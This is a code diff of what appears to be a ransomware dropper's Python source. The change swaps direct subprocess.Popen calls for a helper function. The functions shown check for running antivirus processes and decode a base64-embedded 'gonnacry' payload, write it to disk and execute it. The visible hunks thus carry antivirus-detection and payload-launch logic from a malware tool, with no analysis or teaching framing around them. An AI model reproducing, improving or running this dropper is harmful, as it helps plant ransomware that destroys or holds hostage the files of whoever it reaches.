@@ -1,4 +1,5 @@
 import variables
+import utils
 
 import os
 import subprocess
@@ -43,7 +44,7 @@ def check_av():
     command = 'tasklist /v /fo csv | findstr /i {}'
 
     for process in av_list:
-        subprocess.Popen(command.format(process), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        utils.run_subprocess(command.format(process))
 
 
 def check_open_ports():
@@ -85,8 +86,7 @@ def drop_gonnacry():
         f.write(base64.b64decode(variables.gonnacry))
         
     command = './{}'.format(variables.gonnacry_path)
-    subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
-                        stderr=subprocess.PIPE)
+    utils.run_subprocess(command)
 
 
 if __name__ == "__main__":
